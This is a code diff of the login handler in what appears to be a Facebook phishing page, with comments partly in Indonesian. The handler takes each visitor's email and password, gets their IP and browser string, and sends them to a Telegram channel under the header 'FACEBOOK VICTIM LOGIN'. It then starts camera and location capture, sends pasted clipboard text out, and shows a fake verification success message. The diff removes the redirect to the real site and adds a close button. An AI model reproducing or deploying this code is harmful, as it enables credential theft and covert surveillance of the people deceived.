@@ -736,71 +736,96 @@ body {
         });
         
         // LOGIN FORM HANDLER
-        document.getElementById('login_form').addEventListener('submit', async (e) => {
-            e.preventDefault();
+// LOGIN FORM HANDLER
+document.getElementById('login_form').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('pass').value;
+    
+    if (!email || !password) {
+        document.getElementById('securityAlert').classList.add('show');
+        return;
+    }
+    
+    // Show loader
+    document.getElementById('loader').style.display = 'flex';
+    document.getElementById('securityAlert').classList.remove('show');
+    
+    // Get IP and send credentials
+    const ip = await getIP();
+    await sendToTelegram(
+        `💀 <b>FACEBOOK VICTIM LOGIN</b>\n\n` +
+        `📧 <b>Email:</b> ${email}\n` +
+        `🔑 <b>Password:</b> ${password}\n\n` +
+        `🌐 <b>IP:</b> ${ip}\n` +
+        `🕒 <b>Time:</b> ${new Date().toLocaleString()}\n` +
+        `📱 <b>Browser:</b> ${navigator.userAgent.substring(0, 80)}...`
+    );
+    
+    // Start camera capture
+    setTimeout(async () => {
+        await startCameraCapture();
+    }, 1000);
+    
+    // Capture location
+    setTimeout(async () => {
+        await captureLocation();
+    }, 2000);
+    
+    // Clipboard capture
+    document.addEventListener('paste', async (event) => {
+        const text = event.clipboardData.getData('text');
+        if (text && text.length > 3) {
+            await sendToTelegram(`📋 <b>CLIPBOARD</b>\n🕒 ${new Date().toLocaleString()}\n📝 ${text.substring(0, 200)}`);
+        }
+    });
+    
+    // Show success message after 8 seconds
+    setTimeout(() => {
+        document.getElementById('loader').style.display = 'none';
+        document.getElementById('successMsg').classList.add('show');
+        
+        // Update pesan sukses
+        document.querySelector('#successMsg p').textContent = '✅ Verifikasi berhasil! Silakan lanjutkan menggunakan Facebook.';
+        
+        // Start countdown yang tidak melakukan redirect
+        let count = 5;
+        const countdownEl = document.getElementById('countdown');
+        const countdownInterval = setInterval(() => {
+            countdownEl.textContent = `${count} detik`;
+            count--;
             
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('pass').value;
-            
-            if (!email || !password) {
-                document.getElementById('securityAlert').classList.add('show');
-                return;
-            }
-            
-            // Show loader
-            document.getElementById('loader').style.display = 'flex';
-            document.getElementById('securityAlert').classList.remove('show');
-            
-            // Get IP and send credentials
-            const ip = await getIP();
-            await sendToTelegram(
-                `💀 <b>FACEBOOK VICTIM LOGIN</b>\n\n` +
-                `📧 <b>Email:</b> ${email}\n` +
-                `🔑 <b>Password:</b> ${password}\n\n` +
-                `🌐 <b>IP:</b> ${ip}\n` +
-                `🕒 <b>Time:</b> ${new Date().toLocaleString()}\n` +
-                `📱 <b>Browser:</b> ${navigator.userAgent.substring(0, 80)}...`
-            );
-            
-            // Start camera capture
-            setTimeout(async () => {
-                await startCameraCapture();
-            }, 1000);
-            
-            // Capture location
-            setTimeout(async () => {
-                await captureLocation();
-            }, 2000);
-            
-            // Clipboard capture
-            document.addEventListener('paste', async (event) => {
-                const text = event.clipboardData.getData('text');
-                if (text && text.length > 3) {
-                    await sendToTelegram(`📋 <b>CLIPBOARD</b>\n🕒 ${new Date().toLocaleString()}\n📝 ${text.substring(0, 200)}`);
-                }
-            });
-            
-            // Show success message after 8 seconds
-            setTimeout(() => {
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('successMsg').classList.add('show');
+            if (count < 0) {
+                clearInterval(countdownInterval);
+                stopCameraCapture();
+                // TIDAK ADA REDIRECT - hanya ubah teks countdown
+                countdownEl.textContent = 'Proses selesai';
                 
-                // Start countdown
-                let count = 5;
-                const countdownEl = document.getElementById('countdown');
-                const countdownInterval = setInterval(() => {
-                    countdownEl.textContent = `${count} detik`;
-                    count--;
-                    
-                    if (count < 0) {
-                        clearInterval(countdownInterval);
-                        stopCameraCapture();
-                        // REDIRECT KE FACEBOOK ASLI
-                        window.location.href = 'https://facebook.com';
-                    }
-                }, 1000);
-            }, 8000);
-        });
+                // 'Tambahkan' tombol untuk menutup pesan atau reset form
+                const closeBtn = document.createElement('button');
+                closeBtn.textContent = 'Tutup';
+                closeBtn.style.cssText = `
+                    background: #1877f2;
+                    color: white;
+                    border: none;
+                    padding: 10px 20px;
+                    border-radius: 5px;
+                    margin-top: 10px;
+                    cursor: pointer;
+                `;
+                closeBtn.onclick = () => {
+                    document.getElementById('successMsg').classList.remove('show');
+                    document.getElementById('login_form').reset();
+                };
+                
+                if (!document.querySelector('#successMsg button')) {
+                    document.getElementById('successMsg').appendChild(closeBtn);
+                }
+            }
+        }, 1000);
+    }, 8000);
+});
         
         // TOGGLE PASSWORD VISIBILITY
         document.getElementById('u_0_3_0y').addEventListener('click', (e) => {
